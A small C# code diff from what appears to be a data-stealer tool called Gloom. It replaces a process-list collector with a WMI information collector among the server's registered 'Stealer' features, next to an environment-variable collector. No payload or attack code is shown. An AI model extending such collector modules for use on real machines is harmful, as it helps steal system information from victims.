@@ -1,5 +1,6 @@
 ﻿using Gloom.Server.Features;
 using Gloom.Server.Features.Stealer.InfoCollector;
+using Gloom.Server.Features.Stealer.InfoCollector.Wmi;
 using Serilog;
 using Serilog.Sinks.SystemConsole.Themes;
 using System.Text;
@@ -29,7 +30,7 @@ namespace Gloom.Server
 			Features = new HashSet<FeatureBase>()
 			{
 				new EnvVarsCollector(server),
-				new ProcessListCollector(server)
+				new WmiInfoCollector(server)
 			};
 			foreach (var feature in Features)
 				server.RegisterHandler(feature);
